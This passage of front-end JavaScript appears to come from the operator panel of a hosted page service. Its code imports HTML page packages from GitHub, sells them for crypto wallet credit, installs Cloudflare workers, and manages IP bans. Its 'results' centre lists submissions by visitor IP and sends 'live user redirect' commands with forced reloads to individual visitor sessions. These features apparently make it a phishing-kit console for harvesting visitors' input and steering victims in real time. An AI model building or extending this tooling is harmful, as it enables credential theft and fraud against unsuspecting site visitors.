        ${previewUrl ? `<a href="${escapeHtml(previewUrl)}" target="_blank" rel="noopener">Open package preview</a>` : ""}
        ${editorHash ? `<button type="button" data-route="${escapeHtml(editorHash)}">Edit package</button>` : ""}
      </div>
    ` : ""}
    <div class="github-preview-panel">
      <div>
        <strong>Screen preview</strong>
        ${htmlScreens.length ? htmlScreens.map((screen, index) => `
          <button type="button" data-github-preview-url="${escapeHtml(githubPreviewUrl(scan, screen.file))}" data-github-raw-url="${escapeHtml(githubFileUrl(scan, screen.file, "raw"))}" data-github-preview-name="${escapeHtml(screen.name)}">
            ${String(index + 1).padStart(2, "0")} ${escapeHtml(screen.name)} - ${escapeHtml(screen.file)}
          </button>
        `).join("") : "<span>No HTML screens found yet.</span>"}
      </div>
      <div>
        <strong>CSS and assets</strong>
        <span>${cssFiles.length ? cssFiles.map((file) => escapeHtml(file)).join(" / ") : "No CSS files detected"}</span>
        <span>${assets.length} asset files detected</span>
      </div>
    </div>
    ${firstPreviewUrl ? `
      <div class="github-iframe-shell">
        <div>
          <strong data-github-preview-title>Previewing ${escapeHtml(htmlScreens[0].name)}</strong>
          <a href="${escapeHtml(githubFileUrl(scan, htmlScreens[0].file, "raw"))}" target="_blank" rel="noopener" data-github-preview-open>Open raw</a>
        </div>
        <iframe title="GitHub page preview" src="${escapeHtml(firstPreviewUrl)}" data-github-preview-frame sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
      </div>
    ` : ""}
    <code>Review these files before clicking Import & Publish.</code>
  `;
}

async function scanGithubImport(mode = "scan", triggerButton = null) {
  const createPackageRecord = mode === "draft" || mode === "publish";
  const payload = {
    ...collectGithubImportFields(),
    publish: mode === "publish"
  };
  const endpoint = createPackageRecord ? "/api/admin/import/github/package" : "/api/admin/import/github/scan";
  const resultPanel = preview.querySelector("[data-github-result]");
  const originalLabel = triggerButton?.textContent || "";

  if (!payload.repoUrl) {
    if (resultPanel) {
      resultPanel.innerHTML = `<code>Repository URL is required.</code><code>Paste a GitHub repo URL, then scan again.</code>`;
    }
    statusText.textContent = "GITHUB REPOSITORY URL REQUIRED";
    return;
  }

  if (resultPanel) {
    resultPanel.innerHTML = `
      <code>Checking API connection...</code>
      <code>${escapeHtml(apiBase())}/api/health</code>
    `;
  }
  if (triggerButton) {
    triggerButton.disabled = true;
    triggerButton.textContent = "Checking API...";
  }
  statusText.textContent = "VERIFYING API CONNECTION";

  try {
    const connection = await checkAdminApiConnection();
    if (!connection.ok) {
      if (resultPanel) {
        resultPanel.innerHTML = `
          <code>${escapeHtml(connection.title)}</code>
          <code>${escapeHtml(connection.detail)}</code>
          <code>Backend connection is managed by the app.</code>
        `;
      }
      statusText.textContent = connection.status === 403 ? "ADMIN ACCESS REQUIRED" : "GITHUB IMPORT NEEDS API CONNECTION";
      if (connection.status === 401) window.location.hash = "#login";
      return;
    }

    if (resultPanel) {
      resultPanel.innerHTML = `
        <code>API online: ${escapeHtml(connection.health?.service || "deuce-pages-api")}</code>
        <code>Admin verified: ${escapeHtml(connection.user?.email || "current session")}</code>
        <code>Connecting to GitHub: ${escapeHtml(payload.repoUrl)}</code>
      `;
    }
    if (triggerButton) {
      triggerButton.textContent = mode === "publish" ? "Publishing..." : createPackageRecord ? "Creating..." : "Scanning...";
    }
    statusText.textContent = mode === "publish" ? "IMPORTING AND PUBLISHING PACKAGE" : createPackageRecord ? "CREATING GITHUB PACKAGE DRAFT" : "SCANNING GITHUB REPOSITORY";

    const result = await requestApi(endpoint, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    renderGithubImportResult(result.scan, result.package);
    if (result.package) await loadAppData();
    statusText.textContent = mode === "publish" ? "GITHUB PACKAGE PUBLISHED" : createPackageRecord ? "GITHUB PACKAGE DRAFT CREATED" : "GITHUB REPOSITORY SCANNED";
  } catch (error) {
    if (resultPanel) {
      if (error.data?.scan) {
        renderGithubImportResult(error.data.scan, null);
        resultPanel.insertAdjacentHTML("afterbegin", `
          <code>GitHub import stopped: ${escapeHtml(error.message)}</code>
        `);
      } else {
        resultPanel.innerHTML = `
          <code>GitHub import failed</code>
          <code>${escapeHtml(error.message)}</code>
          <code>Private repos need valid GitHub access. Public repos need the correct branch and folder.</code>
        `;
      }
    }
    statusText.textContent = error.status === 401
      ? "LOGIN REQUIRED"
      : error.status === 403
        ? "ADMIN ACCESS REQUIRED"
        : error.status === 0
          ? "GITHUB IMPORT NEEDS API CONNECTION"
          : "GITHUB IMPORT FAILED";
  } finally {
    if (triggerButton) {
      triggerButton.disabled = false;
      triggerButton.textContent = originalLabel;
    }
  }
}

function sizeMatrix() {
  matrix.width = window.innerWidth * window.devicePixelRatio;
  matrix.height = window.innerHeight * window.devicePixelRatio;
  context.setTransform(window.devicePixelRatio, 0, 0, window.devicePixelRatio, 0, 0);
}

const glyphs = "0123456789ABCDEFx:/[]{}";
let streams = [];

function resetStreams() {
  const columns = Math.ceil(window.innerWidth / 22);
  streams = Array.from({ length: columns }, () => ({
    y: Math.random() * -120,
    speed: 0.35 + Math.random() * 0.9,
    opacity: 0.18 + Math.random() * 0.38
  }));
}

function drawMatrix() {
  context.fillStyle = "rgba(2, 3, 3, 0.18)";
  context.fillRect(0, 0, window.innerWidth, window.innerHeight);
  context.font = "12px Consolas, monospace";

  streams.forEach((stream, index) => {
    const text = glyphs[Math.floor(Math.random() * glyphs.length)];
    const accent = getComputedStyle(document.documentElement).getPropertyValue("--accent").trim();
    context.fillStyle = `${accent}${Math.round(stream.opacity * 255).toString(16).padStart(2, "0")}`;
    context.fillText(text, index * 22, stream.y * 18);
    stream.y = stream.y * 18 > window.innerHeight && Math.random() > 0.965 ? 0 : stream.y + stream.speed;
  });

  requestAnimationFrame(drawMatrix);
}

window.addEventListener("resize", () => {
  sizeMatrix();
  resetStreams();
});

sizeMatrix();
resetStreams();
drawMatrix();
renderButtons();
applyAppearancePreference();
renderBootScreen();
async function initApp() {
  setAppBusy(true, "Loading workspace");
  try {
    syncAdminVisibility();
    await refreshAuthUser();
    await loadAppData();
    syncAdminVisibility();
    await renderRoute();
  } finally {
    clearAppBusySoon(320);
  }
}

initApp();
window.addEventListener("hashchange", () => {
  renderRoute();
});

preview.addEventListener("change", (event) => {
  const packageThumbnailInput = event.target.closest("[data-package-thumbnail]");
  if (packageThumbnailInput) {
    uploadPackageThumbnail(packageThumbnailInput);
    return;
  }

  const marketPlanSelect = event.target.closest("[data-market-plan]");
  if (marketPlanSelect) {
    updateMarketPlanCard(marketPlanSelect);
    return;
  }

  const walletCryptoSelect = event.target.closest('[data-wallet-fund="crypto"]');
  if (walletCryptoSelect) {
    updateWalletFundingAddress(walletCryptoSelect);
    return;
  }

  const adminPageSelect = event.target.closest("[data-admin-page-select]");
  if (adminPageSelect) {
    syncAdminPageToggleFields(adminPageSelect);
    return;
  }
});

preview.addEventListener("input", (event) => {
  if (event.target.closest("[data-session-search-input]")) {
    applyCompactSessionFilters();
  }
  if (event.target.closest('[data-wallet-fund="amount"]')) {
    scheduleWalletFundingQuote();
  }
});

preview.addEventListener("click", async (event) => {
  const clickedButton = event.target.closest("button");
  pulseButton(clickedButton);

  const logoutButton = event.target.closest("[data-logout]");
  if (logoutButton) {
    await withButtonBusy(logoutButton, "Signing out", handleLogout);
    return;
  }

  const routeButton = event.target.closest("[data-route]");
  if (routeButton) {
    setAppBusy(true, "Opening view");
    if (window.location.hash === routeButton.dataset.route) {
      await renderRoute();
      clearAppBusySoon();
    } else {
      window.location.hash = routeButton.dataset.route;
    }
    return;
  }

  const loginSubmitButton = event.target.closest("[data-login-submit]");
  if (loginSubmitButton) {
    await withButtonBusy(loginSubmitButton, "Signing in", handleLogin);
    return;
  }

  const signupSubmitButton = event.target.closest("[data-signup-submit]");
  if (signupSubmitButton) {
    await withButtonBusy(signupSubmitButton, "Creating", handleSignup);
    return;
  }

  const githubScanButton = event.target.closest("[data-github-scan]");
  if (githubScanButton) {
    await withButtonBusy(githubScanButton, "Scanning", () => scanGithubImport("scan", githubScanButton));
    return;
  }

  const githubImportButton = event.target.closest("[data-github-import]");
  if (githubImportButton) {
    await withButtonBusy(githubImportButton, "Creating", () => scanGithubImport("draft", githubImportButton));
    return;
  }

  const githubPublishButton = event.target.closest("[data-github-publish]");
  if (githubPublishButton) {
    await withButtonBusy(githubPublishButton, "Publishing", () => scanGithubImport("publish", githubPublishButton));
    return;
  }

  const marketPreviewButton = event.target.closest("[data-market-preview]");
  if (marketPreviewButton) {
    const pagePackage = marketPages.find((item) => item.slug === marketPreviewButton.dataset.marketPreview);
    const previewUrl = pagePackage ? packagePreviewUrl(pagePackage) : "";
    if (!previewUrl) {
      statusText.textContent = "PACKAGE PREVIEW NOT AVAILABLE";
      return;
    }
    window.open(previewUrl, "_blank", "noopener");
    statusText.textContent = `${pagePackage.name.toUpperCase()} PREVIEW OPENED`;
    return;
  }

  const marketSubscribeButton = event.target.closest("[data-market-subscribe]");
  if (marketSubscribeButton) {
    await withButtonBusy(marketSubscribeButton, "Subscribing", () => subscribeToMarketPackage(marketSubscribeButton));
    return;
  }

  const walletFundToggle = event.target.closest("[data-wallet-fund-toggle]");
  if (walletFundToggle) {
    walletFundOpen = !walletFundOpen;
    renderWallet();
    return;
  }

  const walletHistoryToggle = event.target.closest("[data-wallet-history-toggle]");
  if (walletHistoryToggle) {
    walletHistoryOpen = !walletHistoryOpen;
    renderWallet();
    return;
  }

  const walletFundSubmit = event.target.closest("[data-submit-wallet-fund]");
  if (walletFundSubmit) {
    await withButtonBusy(walletFundSubmit, "Submitting", submitWalletFundRequest);
    return;
  }

  const copyWalletAddressButton = event.target.closest("[data-copy-wallet-address]");
  if (copyWalletAddressButton) {
    const address = preview.querySelector("[data-wallet-address]")?.textContent.trim() || "";
    if (!address || address === "Receiving address not configured") {
      statusText.textContent = "RECEIVING ADDRESS NOT SET";
      return;
    }
    await withButtonBusy(copyWalletAddressButton, "Copying", () => navigator.clipboard.writeText(address));
    statusText.textContent = "WALLET ADDRESS COPIED";
    return;
  }

  const githubPreviewButton = event.target.closest("[data-github-preview-url]");
  if (githubPreviewButton) {
    const frame = preview.querySelector("[data-github-preview-frame]");
    const title = preview.querySelector("[data-github-preview-title]");
    const openLink = preview.querySelector("[data-github-preview-open]");
    const nextUrl = githubPreviewButton.dataset.githubPreviewUrl;
    const rawUrl = githubPreviewButton.dataset.githubRawUrl || nextUrl;
    if (frame && nextUrl) frame.src = nextUrl;
    if (title) title.textContent = `Previewing ${githubPreviewButton.dataset.githubPreviewName || "screen"}`;
    if (openLink && rawUrl) openLink.href = rawUrl;
    preview.querySelectorAll("[data-github-preview-url]").forEach((button) => button.classList.remove("active"));
    githubPreviewButton.classList.add("active");
    statusText.textContent = "GITHUB SCREEN PREVIEW UPDATED";
    return;
  }

  const adminActionButton = event.target.closest("[data-admin-action]");
  if (adminActionButton) {
    statusText.textContent = adminActionButton.dataset.adminAction;
    return;
  }

  const refreshAdminUsersButton = event.target.closest("[data-refresh-admin-users]");
  if (refreshAdminUsersButton) {
    await withButtonBusy(refreshAdminUsersButton, "Refreshing", refreshAdminUsers);
    return;
  }

  const expandAdminUserButton = event.target.closest("[data-admin-user-expand]");
  if (expandAdminUserButton) {
    const userId = expandAdminUserButton.dataset.adminUserExpand;
    if (expandedAdminUsers.has(userId)) expandedAdminUsers.delete(userId);
    else expandedAdminUsers.add(userId);
    renderAdminUsers();
    statusText.textContent = expandedAdminUsers.has(userId) ? "USER CONTROLS EXPANDED" : "USER CONTROLS COLLAPSED";
    return;
  }

  const collabAdminUserButton = event.target.closest("[data-admin-user-collabs]");
  if (collabAdminUserButton) {
    const userId = collabAdminUserButton.dataset.adminUserCollabs;
    if (collabAdminUsers.has(userId)) collabAdminUsers.delete(userId);
    else collabAdminUsers.add(userId);
    renderAdminUsers();
    statusText.textContent = collabAdminUsers.has(userId) ? "USER COLLABS OPEN" : "USER COLLABS HIDDEN";
    return;
  }

  const saveAdminUserButton = event.target.closest("[data-save-admin-user]");
  if (saveAdminUserButton) {
    await withButtonBusy(saveAdminUserButton, "Saving", () => saveAdminUserAccess(saveAdminUserButton.dataset.saveAdminUser));
    return;
  }

  const adminWalletCreditButton = event.target.closest("[data-admin-wallet-credit]");
  if (adminWalletCreditButton) {
    await withButtonBusy(adminWalletCreditButton, "Crediting", () => adjustAdminUserWallet(adminWalletCreditButton.dataset.adminWalletCredit, "credit"));
    return;
  }

  const adminWalletDebitButton = event.target.closest("[data-admin-wallet-debit]");
  if (adminWalletDebitButton) {
    await withButtonBusy(adminWalletDebitButton, "Debiting", () => adjustAdminUserWallet(adminWalletDebitButton.dataset.adminWalletDebit, "debit"));
    return;
  }

  const adminPageExtendButton = event.target.closest("[data-admin-page-extend]");
  if (adminPageExtendButton) {
    await withButtonBusy(adminPageExtendButton, "Extending", () => extendAdminUserPage(adminPageExtendButton.dataset.adminPageExtend));
    return;
  }

  const approveWalletFundButton = event.target.closest("[data-approve-wallet-fund]");
  if (approveWalletFundButton) {
    await withButtonBusy(approveWalletFundButton, "Approving", () => approveWalletFundRequest(approveWalletFundButton));
    return;
  }

  const reviewWalletFundButton = event.target.closest("[data-review-wallet-fund]");
  if (reviewWalletFundButton) {
    await withButtonBusy(reviewWalletFundButton, "Reviewing", () => updateWalletFundReview(reviewWalletFundButton, "reviewing"));
    return;
  }

  const rejectWalletFundButton = event.target.closest("[data-reject-wallet-fund]");
  if (rejectWalletFundButton) {
    await withButtonBusy(rejectWalletFundButton, "Rejecting", () => updateWalletFundReview(rejectWalletFundButton, "reject"));
    return;
  }

  const configButton = event.target.closest("[data-config-page]");
  if (configButton) {
    setAppBusy(true, "Opening config");
    window.location.hash = `config-${configButton.dataset.configPage}`;
    return;
  }

  const goLiveButton = event.target.closest("[data-go-live]");
  if (goLiveButton) {
    setAppBusy(true, "Opening Go Live");
    window.location.hash = `go-live-${goLiveButton.dataset.goLive}`;
    return;
  }

  const securityButton = event.target.closest("[data-security]");
  if (securityButton) {
    setAppBusy(true, "Opening security");
    window.location.hash = `security-${securityButton.dataset.security}:${securityButton.dataset.securityTab}`;
    return;
  }

  const pageLogButton = event.target.closest("[data-page-log]");
  if (pageLogButton) {
    setAppBusy(true, "Opening page log");
    window.location.hash = `security-${pageLogButton.dataset.pageLog}:log`;
    return;
  }

  const resultsButton = event.target.closest("[data-results]");
  if (resultsButton) {
    setAppBusy(true, "Opening results");
    window.location.hash = `results-${resultsButton.dataset.results}`;
    return;
  }

  const refreshResultsButton = event.target.closest("[data-refresh-results]");
  if (refreshResultsButton) {
    await withButtonBusy(refreshResultsButton, "Refreshing", () => renderResultsCenter(refreshResultsButton.dataset.refreshResults));
    statusText.textContent = "RESULTS CONTROL CENTER REFRESHED";
    return;
  }

  const downloadButton = event.target.closest("[data-download-index]");
  if (downloadButton) {
    downloadGeneratedIndex(getPageBySlug(downloadButton.dataset.downloadIndex));
    return;
  }

  const saveSecurityButton = event.target.closest("[data-save-security]");
  if (saveSecurityButton) {
    saveSecurityConfig(getPageBySlug(saveSecurityButton.dataset.saveSecurity), saveSecurityButton.dataset.saveSecurityTab || "security");
    return;
  }

  const saveUserConfigButton = event.target.closest("[data-save-user-config]");
  if (saveUserConfigButton) {
    saveUserConfig(getPageBySlug(saveUserConfigButton.dataset.saveUserConfig));
    return;
  }

  const renewPageButton = event.target.closest("[data-renew-page]");
  if (renewPageButton) {
    await withButtonBusy(renewPageButton, "Renewing", () => renewPageFromWallet(getPageBySlug(renewPageButton.dataset.renewPage)));
    return;
  }

  const saveHostingButton = event.target.closest("[data-save-hosting]");
  if (saveHostingButton) {
    saveHostingConfig(getPageBySlug(saveHostingButton.dataset.saveHosting));
    return;
  }

  const verifyHostingButton = event.target.closest("[data-verify-hosting]");
  if (verifyHostingButton) {
    saveHostingConfig(getPageBySlug(verifyHostingButton.dataset.verifyHosting), true);
    return;
  }

  const relaySecretButton = event.target.closest("[data-generate-relay-secret]");
  if (relaySecretButton) {
    generateRelaySecretForPage(getPageBySlug(relaySecretButton.dataset.generateRelaySecret));
    return;
  }

  const copyWorkerButton = event.target.closest("[data-copy-worker]");
  if (copyWorkerButton) {
    const workerCode = preview.querySelector(`[data-worker-code="${copyWorkerButton.dataset.copyWorker}"]`);
    if (!workerCode) {
      statusText.textContent = "WORKER SCRIPT NOT FOUND";
      return;
    }
    await withButtonBusy(copyWorkerButton, "Copying", () => navigator.clipboard.writeText(workerCode.value));
    statusText.textContent = "CLOUDFLARE WORKER SCRIPT COPIED";
    return;
  }

  const verifyCloudflareButton = event.target.closest("[data-verify-cloudflare]");
  if (verifyCloudflareButton) {
    await withButtonBusy(verifyCloudflareButton, "Verifying", () => verifyCloudflareForPage(getPageBySlug(verifyCloudflareButton.dataset.verifyCloudflare)));
    return;
  }

  const installCloudflareButton = event.target.closest("[data-install-cloudflare]");
  if (installCloudflareButton) {
    await withButtonBusy(installCloudflareButton, "Installing", () => installCloudflareForPage(getPageBySlug(installCloudflareButton.dataset.installCloudflare)));
    return;
  }

  const securityRemoveIpButton = event.target.closest("[data-security-remove-ip]");
  if (securityRemoveIpButton) {
    const resultPage = getPageBySlug(securityRemoveIpButton.dataset.securityPage);
    const ip = securityRemoveIpButton.dataset.securityRemoveIp || "";
    if (!resultPage || !ip) {
      statusText.textContent = "SECURITY IP REQUIRED";
      return;
    }
    await withButtonBusy(securityRemoveIpButton, "Removing", async () => {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/ip-rule`, {
        method: "DELETE",
        body: JSON.stringify({ ip })
      });
      applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
      await renderSecurityCenter(pageRouteKey(resultPage), "ips");
      statusText.textContent = `${ip} REMOVED FROM IP RULES`;
    }).catch((error) => {
      statusText.textContent = `IP REMOVE FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const trafficIpAction = event.target.closest("[data-traffic-ban-ip], [data-traffic-whitelist-ip]");
  if (trafficIpAction) {
    const resultPage = getPageBySlug(trafficIpAction.dataset.trafficPage);
    const ip = trafficIpAction.dataset.trafficBanIp || trafficIpAction.dataset.trafficWhitelistIp || "";
    if (!resultPage || !ip) {
      statusText.textContent = "TRAFFIC IP REQUIRED";
      return;
    }
    const isBan = Boolean(trafficIpAction.dataset.trafficBanIp);
    await withButtonBusy(trafficIpAction, isBan ? "Banning" : "Trusting", async () => {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/${isBan ? "ban-ip" : "whitelist-ip"}`, {
        method: "POST",
        body: JSON.stringify({ ip })
      });
      applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
      await renderSecurityCenter(pageRouteKey(resultPage), "traffic");
      statusText.textContent = isBan ? `${ip} BANNED` : `${ip} WHITELISTED`;
    }).catch((error) => {
      statusText.textContent = `IP ACTION FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const sessionFilterButton = event.target.closest("[data-session-filter-button]");
  if (sessionFilterButton) {
    event.preventDefault();
    preview.querySelectorAll("[data-session-filter-button]").forEach((button) => button.classList.remove("is-active"));
    sessionFilterButton.classList.add("is-active");
    applyCompactSessionFilters();
    statusText.textContent = `SESSION FILTER: ${sessionFilterButton.dataset.sessionFilterButton}`.toUpperCase();
    return;
  }

  const sessionRedirectButton = event.target.closest("[data-session-redirect]");
  if (sessionRedirectButton) {
    event.preventDefault();
    const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
    const sessionId = sessionRedirectButton.dataset.sessionRedirect;
    const targetField = [...preview.querySelectorAll("[data-session-target]")]
      .find((field) => field.dataset.sessionTarget === sessionId);
    const targetUrl = sessionRedirectButton.dataset.sessionTargetUrl || targetField?.value.trim() || "";
    const targetLabel = sessionRedirectButton.dataset.sessionTargetLabel || targetUrl;
    const forceReload = sessionRedirectButton.dataset.sessionForceReload === "true";
    if (!resultPage || !targetUrl) {
      statusText.textContent = "REDIRECT TARGET REQUIRED";
      return;
    }
    await withButtonBusy(sessionRedirectButton, "Redirecting", async () => {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
        method: "POST",
        body: JSON.stringify({ targetUrl, note: targetLabel, forceReload })
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(pageRouteKey(updated));
      statusText.textContent = "LIVE USER REDIRECT QUEUED";
      window.setTimeout(() => {
        const latest = getPageBySlug(pageRouteKey(updated));
        if (latest) renderResultsCenter(pageRouteKey(updated));
      }, 5500);
    }).catch((error) => {
      statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const sessionClearButton = event.target.closest("[data-session-clear]");
  if (sessionClearButton) {
    event.preventDefault();
    const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
    const sessionId = sessionClearButton.dataset.sessionClear;
    if (!resultPage) return;
    await withButtonBusy(sessionClearButton, "Clearing", async () => {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
        method: "DELETE"
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(pageRouteKey(updated));
      statusText.textContent = "LIVE USER COMMAND CLEARED";
    }).catch((error) => {
      statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const resultAction = event.target.closest("[data-result-page]");
  if (resultAction) {
    const resultPage = getPageBySlug(resultAction.dataset.resultPage);
    const resultId = resultAction.dataset.viewResult || resultAction.dataset.deleteResult || resultAction.dataset.banResultIp || resultAction.dataset.whitelistResultIp;
    const result = (resultPage.results || []).find((item) => item.id === resultId);
    if (!result) return;

    if (resultAction.dataset.viewResult) {
      statusText.textContent = `${resultPage.name.toUpperCase()} RESULT FROM ${result.ip} SELECTED`;
      return;
    }

    if (resultAction.dataset.deleteResult) {
      await withButtonBusy(resultAction, "Deleting", async () => {
        await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
        resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = "RESULT DELETED";
      });
      return;
    }

    if (resultAction.dataset.banResultIp) {
      await withButtonBusy(resultAction, "Banning", async () => {
        const updated = await requestApi(`/api/user-pages/${resultPage.id}/ban-ip`, {
          method: "POST",
          body: JSON.stringify({ ip: result.ip })
        });
        applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = `${result.ip} BANNED`;
      });
      return;
    }

    if (resultAction.dataset.whitelistResultIp) {
      await withButtonBusy(resultAction, "Trusting", async () => {
        const updated = await requestApi(`/api/user-pages/${resultPage.id}/whitelist-ip`, {
          method: "POST",
          body: JSON.stringify({ ip: result.ip })
        });
        applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = `${result.ip} WHITELISTED`;
      });
      return;
    }
  }

});
